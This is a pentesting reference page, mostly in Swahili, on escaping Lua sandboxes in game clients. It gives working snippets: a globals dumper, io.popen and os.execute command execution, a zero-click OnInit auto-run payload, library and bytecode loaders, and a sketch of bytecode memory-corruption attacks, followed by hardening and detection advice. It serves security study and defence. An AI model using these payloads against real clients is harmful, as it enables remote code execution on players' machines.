# Bypass Lua sandboxes (embedded VMs, game clients)

Ukurasa huu unakusanya mbinu za vitendo za kuorodhesha na kutoroka kutoka kwenye Lua "sandboxes" zilizopachikwa kwenye applications (hasa game clients, plugins, au in-app scripting engines). Engines nyingi hufichua mazingira ya Lua yaliyowekewa vizuizi, lakini huacha globals zenye nguvu zikiwa zinaweza kufikiwa, jambo linalowezesha utekelezaji wa arbitrary commands au hata native memory corruption wakati bytecode loaders zimefichuliwa.

Mawazo muhimu:
- Ichukulie VM kama mazingira yasiyojulikana: orodhesha _G na gundua ni primitives gani hatari zinaweza kufikiwa.
- Wakati stdout/print imezuiwa, tumia vibaya channel yoyote ya UI/IPC iliyo ndani ya VM kama output sink ili kuona matokeo.
- Ikiwa io/os imefichuliwa, mara nyingi unakuwa na direct command execution (io.popen, os.execute).
- Ikiwa load/loadstring/loadfile zimefichuliwa, kutekeleza crafted Lua bytecode kunaweza kuathiri memory safety katika baadhi ya versions (verifiers za ≤5.1 zinaweza kuepukwa; 5.2 iliondoa verifier), na kuwezesha advanced exploitation.

## Enumerate the sandboxed environment

- Dump global environment ili kuorodhesha tables/functions zinazoweza kufikiwa:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Ikiwa print() haipatikani, tumia tena channels za in-VM. Mfano kutoka VM ya script ya MMO housing ambapo chat output hufanya kazi tu baada ya sound call; ifuatayo huunda output function inayotegemeka:<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Jumlisha muundo huu kwa target yako: textbox, toast, logger, au UI callback yoyote inayokubali strings inaweza kutumika kama stdout kwa reconnaissance.

## Utekelezaji wa amri moja kwa moja ikiwa io/os imefichuliwa

Ikiwa sandbox bado inafichua standard libraries io au os, huenda ukawa na command execution ya papo hapo:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Vidokezo:

- Utekelezaji hufanyika ndani ya client process; tabaka nyingi za anti-cheat/antidebug zinazozuia external debuggers hazitazuia uundaji wa process ndani ya VM.
- Pia kagua: package.loadlib (upakiaji wa DLL/.so holela), require yenye native modules, ffi ya LuaJIT (ikiwa ipo), na debug library (inaweza kuongeza privileges ndani ya VM).

## Vichocheo vya zero-click kupitia auto-run callbacks

Ikiwa host application inasukuma scripts kwa clients na VM inaonyesha auto-run hooks (k.m., OnInit/OnLoad/OnEnter), weka payload yako hapo kwa drive-by compromise mara tu script inapopakiwa:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Callback yoyote inayolingana (OnLoad, OnEnter, n.k.) hujumlisha technique hii wakati scripts zinapotumwa na kutekelezwa kwenye client kiotomatiki.

## Primitives hatari za kutafuta wakati wa recon

Wakati wa ku-enumerate _G, tafuta hasa:
- io, os: io.popen, os.execute, file I/O, ufikiaji wa env.
- load, loadstring, loadfile, dofile: hutekeleza source au bytecode; huwezesha kupakia bytecode isiyoaminika.
- package, package.loadlib, require: upakiaji wa dynamic library na module surface.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, na hooks.
- LuaJIT-only: ffi.cdef, ffi.load ili kuita native code moja kwa moja.

Mifano midogo ya matumizi (ikiwa inafikika):

Lua's loader API ilibadilika kati ya versions: katika Lua 5.1, `load` husoma kutoka kwa reader function na `loadstring` husoma kutoka kwa string; Lua 5.2's `load` hukubali string au reader function, na `loadstring` imepitwa na wakati kwa kuwa ni equivalent yake.<sup>[[5]](#references)[[6]](#references)</sup>
```lua
-- Lua 5.2+ source loader; Lua 5.1 use loadstring("return 1+1")
local f = load("return 1+1")
print(f()) -- 2

-- Lua 5.1 string/bytecode loader
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Escalation ya hiari: kutumia vibaya Lua bytecode loaders

Wakati load/loadstring/loadfile zinapatikana lakini io/os zimewekewa vizuizi, utekelezaji wa Lua bytecode iliyoundwa maalum unaweza kusababisha memory disclosure na corruption primitives. Mambo muhimu:
- Lua ≤ 5.1 ilisafirishwa ikiwa na bytecode verifier yenye bypasses zinazojulikana.<sup>[[4]](#references)</sup>
- Lua 5.2 iliondoa verifier kabisa (msimamo rasmi: applications zinapaswa tu kukataa precompiled chunks), hivyo kupanua attack surface ikiwa bytecode loading haijakatazwa.<sup>[[2]](#references)[[3]](#references)</sup>
- Workflows kwa kawaida: kuvuja pointers kupitia in-VM output, kuunda bytecode inayosababisha type confusions (kwa mfano, karibu na FORLOOP au opcodes nyingine), kisha kuhamia kwenye arbitrary read/write au native code execution.<sup>[[2]](#references)[[4]](#references)</sup>

Njia hii inategemea engine/version na inahitaji RE. Tazama references kwa uchambuzi wa kina, exploitation primitives, na mfano wa gadgetry katika games.

## Maelezo ya Detection na hardening (kwa defenders)

- Server side: kataa au andika upya user scripts; ruhusu safe APIs zilizo kwenye allowlist; strip au bind-empty io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Client side: endesha Lua ikiwa na _ENV ndogo, kataza bytecode loading, reintroduce strict bytecode verifier au signature checks, na zuia process creation kutoka kwa client process.
- Telemetry: toa alert wakati gameclient → child process creation inapotokea muda mfupi baada ya script load; korelasha na matukio ya UI/chat/script.

## References

- [1] [Nyumba hii ina Haunted: RCE ya muongo mmoja uliopita katika AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Bytecode Breakdown: Kufichua dosari za Lua Security za Factorio](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): Majadiliano kuhusu kuondoa bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Exploiting Lua 5.1 bytecode (gist yenye verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)
- [5] [Lua 5.1 Reference Manual](https://www.lua.org/manual/5.1/manual.html#pdf-loadstring)
- [6] [Lua 5.2 Reference Manual](https://www.lua.org/manual/5.2/manual.html#pdf-load)
{{#include ../../../banners/hacktricks-training.md}}
